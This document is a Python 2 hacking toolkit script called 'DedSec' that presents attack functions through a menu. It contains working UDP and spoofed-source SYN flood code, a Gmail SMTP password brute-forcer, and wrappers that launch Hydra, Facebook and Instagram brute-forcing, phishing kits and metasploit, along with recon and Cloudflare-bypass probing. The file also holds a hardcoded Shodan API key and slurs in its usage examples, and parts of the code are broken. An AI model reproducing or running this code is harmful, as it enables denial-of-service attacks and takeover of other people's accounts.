#!/usr/local/bin/python
# coding: latin-1
import platform
import webbrowser
import hashlib
import subprocess
import zipfile
import colorama
from modules import *
import modules.colors
import builtwith
from urllib2 import Request, urlopen, URLError, HTTPError
from urllib import urlencode
from plugins.DNSDumpsterAPI import DNSDumpsterAPI
import whois
import json
from urlparse import urlparse
from re import search, sub
import cookielib
import socket
from scapy.all import *
from threading import Thread, active_count
import os
import random
import string
import signal
import ssl  
import argparse
import sys
import socks
import mechanize
import requests
import time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
Gb = random._urandom(20000)
bytes = random._urandom(20000)
Kb = random._urandom(20000)
r = '\033[31m'
W = '\033[90m'
R = '\033[91m'
N = '\033[0m'
G = '\033[92m'
B = '\033[94m'
Y = '\033[93m'
LB = '\033[1;36m'
P = '\033[95m'
Bl = '\033[30m'
O = '\033[33m'
p = '\033[35m'
os.system("service tor start")
os.system("clear")
def banner():
	print G+"""
░ ▒░▓  ░▒ ▒▒ ▓▒░ ▒░   ░  ░ ▒ ░   ░ ░▒ ▒  ░░▓  ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▓░▒ ▒  ░░ ▒▒░ ▒ 
░ ░ ▒  ░░ ░▒ ▒░░  ░      ░ ░       ░  ▒    ▒ ░░░▒░ ░ ░   ▒   ▒▒ ░  ▒ ░ ░   ░ ▒░  ░ 
  ░ ░   ░ ░░ ░ ░      ░    ░ ░   ░         ▒ ░ ░░░ ░ ░   ░   ▒     ░   ░     ░   ░ 
    ░  ░░  ░          ░          ░ ░       ░     ░           ░  ░    ░        ░    
    ░  ░░  ░          ░          ░ ░       ░     ░           ░  ░    ░        ░\033[0m    
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~			 			\033[92m
▓█████▄ ▓█████ ▓█████▄   ██████ ▓█████  ▄████▄  
▒██▀ ██▌▓█   ▀ ▒██▀ ██▌▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
░██   █▌▒███   ░██   █▌░ ▓██▄   ▒███   ▒▓█    ▄ 
░▓█▄   ▌▒▓█  ▄ ░▓█▄   ▌  ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
░▒████▓ ░▒████▒░▒████▓ ▒██████▒▒░▒████▒▒ ▓███▀ ░
 ▒▒▓  ▒ ░░ ▒░ ░ ▒▒▓  ▒ ▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
 ░ ▒  ▒  ░ ░  ░ ░ ▒  ▒ ░ ░▒  ░ ░ ░ ░  ░  ░  ▒   
 ░ ░  ░    ░    ░ ░  ░ ░  ░  ░     ░   ░        
   ░       ░  ░   ░          ░     ░  ░░ ░      
 ░              ░                      ░              
	""".decode('utf-8')
	print N+"Created By \033[92mXforWorks\033[0m(Retr0)\n"
banner()

def help():
	print Y+"""
╔\033[94m███████████████████████████████████████████████████████████████\033[93m╗
║\033[92m                          help                                 \033[93m║
║\033[92m---------------------------------------------------------------\033[93m║
║                                                               ║
║                                                               ║
║               ?    :  displays this message                   ║
║               exit :  hacks FBI                               ║
║               clear:  hacks CIA                               ║
║               udp  :  UDP flood                               ║
║               tcp  :  TCP flood                               ║
║               syn  :  SYN flood                               ║
║               pinfo :  get info from phone number             ║
║               ipgrab :  web to ip                             ║
║               port :  port scan                               ║
║               ping :	pinging shit                            ║
║               lscipt :  the lazy script                       ║
║               msf  :	metasploit                              ║
║               sys  :	sytem info                              ║
║               info :  info gather                             ║
║               set  :  setoolkit                               ║
║               redhawk :  stealing website info                ║
║               hydra :  use hydra                              ║
║               shellphish :  shellphish hack                   ║
║               trackip :  tracing ip address                   ║
║               cupp :  wordlist maker                          ║
║                                                               ║
║                                                               ║
╚\033[94m███████████████████████████████████████████████████████████████\033[93m╝
	""".decode('utf-8')                                                                

def ipgrab():
	target = raw_input(G+"Enter Host: ")
	ip = socket.gethostbyname(target)
	print Y+"[\033[92m+\033[91m-\033[0mIP:	%s \033[91m-\033[92m+\033[93m]\033[0m"(ip)

def port():
	portscan = raw_input(R+"Enter Host: ")
	ip = socket.gethostbyname(portscan)
	os.system("nmap -Pn " + ip)

def ping():
	target = raw_input(G+"Enter Host: ")
	ip = socket.gethostbyname(target)
	while True:
		os.system("ping " + ip)

def sys():
	os.system("neofetch")
def info():
  while True:


      print(Banner)
      print '\r'



      def reverseHackTarget(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "http://api.hackertarget.com/reverseiplookup/?q="
          combo = "{url}{website}".format(url=url, website=webs)
          request = requests.get(combo, headers=functions._headers, timeout=5).text.encode('UTF-8')
          if len(request) != 5:
              list = request.strip("").split("\n")
              for _links in list:
                  if len(_links) != 0:
                      write(var="+", color=w, data=_links)
          else:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")


      def reverseYouGetSignal(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "https://domains.yougetsignal.com/domains.php"
          post = {
              'remoteAddress' : webs,
              'key' : ''
          }
          request = requests.post(url, headers=functions._headers, timeout=5, data=post).text.encode('UTF-8')

          grab = json.loads(request)

          Status = grab['status']
          IP = grab['remoteIpAddress']
          Domain = grab['remoteAddress']
          Total_Domains = grab['domainCount']
          Array = grab['domainArray']

          if (Status == 'Fail'):
              write(var="+", color=r, data="Sorry! Reverse Ip Limit Reached.")
          else:
              write(var="*", color=c, data="IP: " + IP + "")
              write(var="*", color=c, data="Domain: " + Domain + "")
              write(var="*", color=c, data="Total Domains: " + Total_Domains + "\n")

              domains = []

              for x, y in Array:
                  domains.append(x)

              for res in domains:
                  write(var="+", color=w, data=res)


      def geoip(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "http://api.hackertarget.com/geoip/?q="
          combo = "{url}{website}".format(url=url, website=webs)
          request = requests.get(combo, headers=functions._headers, timeout=5).text.encode('UTF-8')
          if len(request) != 5:
              list = request.strip("").split("\n")
              for _links in list:
                  if len(_links) != 0:
                      write(var="+", color=w, data=_links)
          else:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")



      def httpheaders(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "http://api.hackertarget.com/httpheaders/?q="
          combo = "{url}{website}".format(url=url, website=webs)
          request = requests.get(combo, headers=functions._headers, timeout=5).text.encode('UTF-8')
          if len(request) != 5:
              list = request.strip("").split("\n")
              for _links in list:
                  if len(_links) != 0:
                      write(var="+", color=w, data=_links)
          else:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")


      def cloudflare(website):
          subdomainlist = ["ftp", "cpanel", "webmail", "localhost", "local", "mysql", "forum", "driect-connect", "blog",
                           "vb", "forums", "home", "direct", "forums", "mail", "access", "admin", "administrator",
                           "email", "downloads", "ssh", "owa", "bbs", "webmin", "paralel", "parallels", "www0", "www",
                           "www1", "www2", "www3", "www4", "www5", "shop", "api", "blogs", "test", "mx1", "cdn", "mysql",
                           "mail1", "secure", "server", "ns1", "ns2", "smtp", "vpn", "m", "mail2", "postal", "support",
                           "web", "dev"]

          for sublist in subdomainlist:
              try:
                  hosts = str(sublist) + "." + str(website)
                  showip = socket.gethostbyname(str(hosts))
                  print "[!] CloudFlare Bypass " + str(showip) + ' | ' + str(hosts)
              except:
                  write(var="@", color=r,data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")


      def whois(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "http://api.hackertarget.com/whois/?q="
          combo = "{url}{website}".format(url=url, website=webs)
          request = requests.get(combo, headers=functions._headers, timeout=5).text.encode('UTF-8')
          if len(request) != 5:
              list = request.strip("").split("\n")
              for _links in list:
                  if len(_links) != 0:
                      write(var="+", color=w, data=_links)
          else:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")


      def dnslookup(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "http://api.hackertarget.com/dnslookup/?q="
          combo = "{url}{website}".format(url=url, website=webs)
          request = requests.get(combo, headers=functions._headers, timeout=5).text.encode('UTF-8')
          if len(request) != 5:
              list = request.strip("").split("\n")
              for _links in list:
                  if len(_links) != 0:
                      write(var="+", color=w, data=_links)
          else:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")


      def findshareddns(website):
          website = addHTTP(website)
          webs = removeHTTP(website)
          url = "http://api.hackertarget.com/findshareddns/?q="
          combo = "{url}{website}".format(url=url, website=webs)
          request = requests.get(combo, headers=functions._headers, timeout=5).text.encode('UTF-8')
          if len(request) != 5:
              list = request.strip("").split("\n")
              for _links in list:
                  if len(_links) != 0:
                      write(var="+", color=w, data=_links)
          else:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave :')")


      def heading(heading, website, color, afterWebHead):
          space = " " * 10
          var = str(heading + " '" + website + "'" + str(afterWebHead))
          length = len(var) + 1; print "" # \n
          print("\n\n{color}" + var).format(color=color)
          print("{white}" + "-" * length + "--").format(white=w); print "" # \n


      def fetch(url, decoding='utf-8'):
          return urlopen(url).read().decode(decoding)


      def portchacker(domain):
          try:
              port = "http://api.hackertarget.com/nmap/?q=" + domain
              pport = fetch(port)
              print (pport)
          except:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")


      def CmsScan(website):

          try:
              website = addHTTP(website)
              webs = removeHTTP(website)
              w = builtwith.builtwith(website)

              print "[+] Cms : " , w["cms"][0]
              print "[+] Web Servers : " , w["web-servers"][0]
              print "[+] Programming Languages : " , w["programming-languages"][0]
              print "\n"
          except:
              write(var="@", color=r,data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")


      def RobotTxt(domain):

          if not (domain.startswith('http://') or domain.startswith('https://')):
              domain = 'http://' + domain
          robot = domain + "/robots.txt"
          try:
              probot = fetch(robot)
              print(probot)
          except URLError:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")


      def PageAdminFinder(link):
          f = open("admin.txt","r")
          print "\n\nAvilable Links : \n"
          while True:
              sub_link = f.readline()
              if not sub_link:
                  break
              req_link = "http://" + link + "/" + sub_link
              req = Request(req_link)
              try:
                  response = urlopen(req)
              except HTTPError as e:
                  continue
              except URLError as e:
                  break
                  write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")
              else:
                  print "Find Page >> ", req_link


      def Traceroute(website):
          try:
              port = "https://api.hackertarget.com/mtr/?q=" + website
              pport = fetch(port)
              print (pport)
          except:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")


      def HoneypotDetector(ipaddress):
          honey = "https://api.shodan.io/labs/honeyscore/" + ipaddress + "?key=C23OXE0bVMrul2YeqcL7zxb6jZ4pj2by"

          try:
              phoney = fetch(honey)

          except URLError:
              phoney = None
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")

          if phoney:
              print('Honeypot Percent : {probability}'.format(
                  color='2' if float(phoney) < 0.5 else '3', probability=float(phoney) * 10))
              print "\n"



      def ping(website):
          try:
              port = "http://api.hackertarget.com/nping/?q=" + website
              pport = fetch(port)
              print (pport)
          except:
              write(var="@", color=r, data="Sorry, The webserver of the website you entered have no domains other then the one you gave ")


      print b + """
      1 - Reverse IP With HackTarget
      2 - Reverse IP With YouGetSignal
      3 - Geo IP Lookup
      4 - Whois
      5 - Bypass CloudFlare
      6 - DNS Lookup
      7 - Find Shared DNS
      8 - Show HTTP Header
      9 - Port Scan
      10 - CMS Scan
      11 - Page Admin Finder
      12 - Robots.txt
      13 - Traceroute
      14 - Honeypot Detector
      15 - Ping
      16 - All
      17 - Exit
      
      """

      EnterApp = raw_input("Enter : ")



      if EnterApp == "1":
          m = raw_input("Enter Address Website = ")
          heading(heading="Reversing IP With HackTarget", color=c, website=m, afterWebHead="")
          reverseHackTarget(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "2":
          m = raw_input("Enter Address Website = ")
          heading(heading="Reverse IP With YouGetSignal", color=c, website=m, afterWebHead="")
          reverseYouGetSignal(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "3":
          m = raw_input("Enter Address Website = ")
          heading(heading="Geo IP Lookup", color=c, website=m, afterWebHead="")
          geoip(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "4":
          m = raw_input("Enter Address Website = ")
          heading(heading="Whois", color=c, website=m, afterWebHead="")
          whois(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "5":
          m = raw_input("Enter Address Website = ")
          heading(heading="Bypass Cloudflare", color=c, website=m, afterWebHead="")
          cloudflare(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "6":
          m = raw_input("Enter Address Website = ")
          heading(heading="DNS Lookup", color=c, website=m, afterWebHead="")
          dnslookup(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "7":
          m = raw_input("Enter Address Website = ")
          heading(heading="Find Shared DNS", color=c, website=m, afterWebHead="")
          findshareddns(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "8":
          m = raw_input("Enter Address Website = ")
          heading(heading="Show HTTP Header", color=c, website=m, afterWebHead="")
          httpheaders(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "9":
          m = raw_input("Enter Address Website = ")
          heading(heading="PortChacker", color=c, website=m, afterWebHead="")
          portchacker(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")



      elif EnterApp == "10":
          m = raw_input("Enter Address Website = ")
          heading(heading="CMS Scan", color=c, website=m, afterWebHead="")
          CmsScan(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")



      elif EnterApp == "11":
          m = raw_input("Enter Address Website = ")
          heading(heading="Page Admin Finder", color=c, website=m, afterWebHead="")
          PageAdminFinder(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


          

      elif EnterApp == "12":
          m = raw_input("Enter Address Website = ")
          heading(heading="Robot.txt", color=c, website=m, afterWebHead="")
          RobotTxt(m)
          raw_input("[*] Back To Menu (Press Enter...) ")



      elif EnterApp == "13":
          m = raw_input("Enter Address Website = ")
          heading(heading="Traceroute", color=c , website=m , afterWebHead="")
          Traceroute(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "14":
          m = raw_input("Enter (IP) Address = ")
          heading(heading="Honeypot Detector", color=c , website=m , afterWebHead="")
          HoneypotDetector(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")



      elif EnterApp == "15":
          m = raw_input("Enter Address Website = ")
          heading(heading="Ping", color=c , website=m , afterWebHead="")
          ping(m)
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "16":

          m = raw_input("Enter Address Website = ")

          heading(heading="Reversing IP With HackTarget", color=c, website=m, afterWebHead="")
          reverseHackTarget(m)

          heading(heading="Reverse IP With YouGetSignal", color=c, website=m, afterWebHead="")
          reverseYouGetSignal(m)

          heading(heading="Geo IP Lookup", color=c, website=m, afterWebHead="")
          geoip(m)

          heading(heading="Whois", color=c, website=m, afterWebHead="")
          whois(m)

          heading(heading="Bypass Cloudflare", color=c, website=m, afterWebHead="")
          cloudflare(m)

          heading(heading="DNS Lookup", color=c, website=m, afterWebHead="")
          dnslookup(m)

          heading(heading="Find Shared DNS", color=c, website=m, afterWebHead="")
          findshareddns(m)

          heading(heading="Show HTTP Header", color=c, website=m, afterWebHead="")
          httpheaders(m)

          heading(heading="Port Scan", color=c, website=m, afterWebHead="")
          portchacker(m)

          heading(heading="Cms Scan", color=c, website=m, afterWebHead="")
          CmsScan(m)

          heading(heading="Robot.txt", color=c, website=m, afterWebHead="")
          RobotTxt(m)

          heading(heading="Traceroute", color=c , website=m , afterWebHead="")
          Traceroute(m)

          heading(heading="Ping", color=c , website=m , afterWebHead="")
          ping(m)

          heading(heading="Page Admin Finder", color=c, website=m, afterWebHead="")
          PageAdminFinder(m)
          
          print "\n"
          raw_input("[*] Back To Menu (Press Enter...) ")


      elif EnterApp == "17":
          print "\n"
          break


      else:
          print "[!] Please Enter a Number"
          raw_input("[*] Back To Menu (Press Enter...) ")

def syn():
  def randomIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

  def randInt():
    x = random.randint(1000,9000)
    return x  

  def SYN_Flood(dstIP,dstPort,counter):
    total = 0
    print "Packets are sending ..."
    for x in range (0,counter):
      s_port = randInt()
      s_eq = randInt()
      w_indow = randInt()

      IP_Packet = IP ()
      IP_Packet.src = randomIP()
      IP_Packet.dst = dstIP

      TCP_Packet = TCP () 
      TCP_Packet.sport = s_port
      TCP_Packet.dport = dstPort
      TCP_Packet.flags = "S"
      TCP_Packet.seq = s_eq
      TCP_Packet.window = w_indow

      send(IP_Packet/TCP_Packet, verbose=0)
      total+=1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)


  def info():

    dstIP = raw_input ("\nTarget IP : ")
    dstPort = input ("Target Port : ")
    
    return dstIP,int(dstPort)
    

  def main():
    dstIP,dstPort = info()
    counter = input ("Packets : ")
    SYN_Flood(dstIP,dstPort,int(counter))

  main()


def instagram():
  print "Type username wordlist threads    Example: --> unkn0wn_bali wordlist.txt 60"
  insta = raw_input("--> ")
  os.system("sudo python /root/tufhub/password/instagram.py " + insta)

def hydra():
  print "Example: -l faggot@gmail.com -s 465 -S -v -V -P gmailcrack.txt -t 32  [!dont type hydra just type arguments!]"
  hydra = raw_input("[HYDRA]$ ")
  os.system("hydra " + hydra)

def facebook():
  print "Type Email / ID  Wordlist    Example: [FACEBOOK->]: nigga.andrew777 facelist.txt"
  facebook = raw_input("[FACEBOOK->]: ")
  os.system("sudo cd password && perl fb-brute.pl " + facebook)

def gmail():
  #!/usr/bin/python
  '''create by XforWorks'''

  import smtplib
  from os import system

  def main():
     print '\033[93m================================================='
     print '\033[91m              created by Xforworks               '
     print '\033[93m================================================='
     print '\033[95m               ++++++++++++++++++++              '
     print '\n                                               '
     print '\033[92m  _,.                                            '
     print '                                                 '
     print '                                                 '
     print '           DedSec                                '
     print '       _,.                   '
     print '     ,` -.)                  '
     print '    ( _/-\\-._               '
     print '   /,|`--._,-^|            , '
     print '   \_| |`-._/||          , | '
     print '     |  `-, / |         /  / '
     print '     |     || |        /  /  '
     print '      `r-._||/   __   /  /   '
     print '  __,-<_     )`-/  `./  /    '
     print '  \   `---    \   / /  /     '
     print '     |           |./  /      '
     print '     /           //  /       '
     print ' \_/  \         |/  /        '
     print '  |    |   _,^- /  /         '
     print '  |    , ``  (\/  /_         '
     print '   \,.->._    \X-=/^         '
     print '   (  /   `-._//^`           '
     print '    `Y-.____(__}             '
     print '     |     {__)              ' 
     print '           () \033[91m  V.1.0        '

  main()
  print '\033[0m[1] start the attack'
  print '[2] exit'
  option = input('==>')
  if option == 1:
     file_path = raw_input('path of passwords file :')
  else:
     system('clear')
     exit()
  pass_file = open(file_path,'r')
  pass_list = pass_file.readlines()
  def login():
      i = 0
      user_name = raw_input('target email :')
      server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
      server.ehlo()
      for password in pass_list:
        i = i + 1
        print str(i) + '/' + str(len(pass_list))
        try:
           server.login(user_name, password)
           system('clear')
           main()
           print '\n'
           print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
           break
        except smtplib.SMTPAuthenticationError as e:
           error = str(e)
           if error[14] == '<':
              system('clear')
              main()
              print '[+] this account has been hacked, password :' + password + '     ^_^'

              break
           else:
              print '[!] password not found => ' + password
  login()

def floodbanner():
	print N+"""
 ░░█▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░█▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░██▓█████▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░▓░░░░░░▓▓██▓▓█░░░░░░░░░░░░░░░░░░░░░░░░░
 ░░▓░░░░░░░░░▓██▓█▓░░░░░░░░░░░░░░░░░░░░░░░
 ░░█░░░░░░░░░░░▓▓██▓░░░░░░░░░░░░░░░░░░░░░░
 ░░█░░░░░░░░░░░░░▓██░░░░░░░░░░░░░░░░░░░░░░
 ░▓█░░░░░░░░░░░░░░░▓█░░░░░░░░░░░░░░░░░░░░░
 ░▓█░░░░░░░░░░░░░░░░▓▓░░░░░░░░░░░░░░░░░░░░
 ░▓█░░░░░░░░░░░░░░░░░░░▓█▓░░░░░░░░░░░░░░░░
 ░▓█░░░░░░░░░░░░░░░░███████░░░░░░░░░░░░░░░
 ░▓█░░░░░░░░░░░░░████████████░░░░░░░░░░░░░
 ░▓█░░░░░░░░░░░░░██░▓████████░░░░░░░░░░░░░
 ░▓█░░░░░░░░░░░░▓█▓░░▓███████░░░░░░░░░░░░░
 ░▓█░░░░░░░░░░░░▓█░░░░███████▓░░░░░░░░░░░░
 ░▓▓░░░░░░░░░░░░▓█░░░▓████████░░░░░░░░░░░░
 ░▓▓░░░░░░░░░░░░▓███░█████████░░░░░░░░░░░░
 ░▓▓░░░░░░░░░░░░░█▓▓░░░░███░▓█░░░░░░░░░░░░
 ░█▓░░░░░░░░░░░░░▓░░█░░████░░█▓░░░░░░░░░░░
 ░█▓░░░░░░░░░░░░░▓█░░░██████░█░░░░░░░░░░░░
 ░█░░░░░░░░░░░░░░▓█▓░▓░░████▓░░░░░░░░░▓░▓█
 ░██░░░░░░░░░░░░░░█░▓░░▓████░░░░░░░░░▓███░
 ░██░░░░░░░░░░░░░░██░░░█████▓░░░░░░░░▓██░▓
 ███▓░░░░░░░░░░█████████████▓░░░░░░░░▓████
 ░███░░░░░░░░█████████████████░░░░░░▓████▓
 ░████░░░░▓█████████████████████░░░░████░░
 ░░█████▓▓████████████████████████▓████░░░
 ░░▓███████████████████████████████████░░░
 ░▓▓░██████████████████████████████████░░░
 ░▓▓░██████████████████████████████████░░░
 ░▓▓░█████████░█████████████▓██████████░░░
 ░█░░░██████▓░░██████████████░░███████░░░░
 ░█░░░██████░░░██████████████░░███████░░░░
 	       FLOOD ATTACKS
 \n
 """.decode('utf-8')

def tcp():
	tcp = raw_input(Y+"[\033[92m+\033[91m-\033[0mTCP\033[91m-\033[92m+\033[93m]\033[0m ")
	os.system("python " + tcp)

def menu():
	found = False
	while not found:
		menu = raw_input(Y+"[\033[92m+\033[91m-\033[0mDedSec\033[91m-\033[92m+\033[93m]\033[0m ")
		if menu == "clear" :
			os.system("clear")
			banner()
		if menu == "exit" :
			print Y+"Exiting ..."
			os.system("sleep 1")
			sys.exit()
		if menu == "?" :
			help()
		if menu == "udp" :
			floodbanner()
			target = raw_input(G+"Target: ")
			ip = socket.gethostbyname(target)
			port = input(G+"Port: ")
			os.system("service tor restart")
			print N+"udp attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
			os.system("sleep 2s")
			sent = 0
			print "KILLING %s CONNECTIONS"%(ip)						
			while True:
				sock.sendto(Gb, (ip,port))
				sock.sendto(bytes, (ip,port))
				sock.sendto(Kb, (ip,port))
				sent = sent + 1
				port = port + 1
				print B+"|+| Slapping \033[0m|\033[31m %s \033[0m| Port |\033[31m %s \033[0m| Bytes |\033[31m %s \033[0m|"%(ip,port,sent)
				if port == 65534:
					port = 1
		if menu == "reboot" :
			os.system("clear")
			os.system("service tor restart")
			os.system("./dedsec.sh")
		if menu == "tcp" :
			floodbanner()
			tcp()
		if menu == "ipgrab" :
			ipgrab()
		if menu == "port" :
			port()
		if menu == "ping" :
			ping()
		if menu == "msf" :
			os.system("msfconsole")
		if menu == "sys" :
			sys()
		if menu == "info" :
			info()
		if menu == "set" :
			os.system("setoolkit")
		if menu == "syn" :
			syn()
		if menu == "redhawk" :
			os.system("php /mnt/c/RED_HAWK/rhawk.php")
		if menu == "hydra" :
			hydra()
                if menu == "pinfo" :
                        os.system("bash phone.sh")
		if menu == "shellphish" :
			os.system("bash /mnt/c/shellphish/shellphish.sh")
		if menu == "trackip" :
			os.system("bash /mnt/c/TrackingScripts/trackip")
		if menu == "cupp" :
			os.system("python3 /mnt/c/cupp/cupp.py -i")
                if menu == "lscript" :
                        os.system("bash /mnt/c/lscript/install.sh")
                        os.system("l")
	found = True
menu()
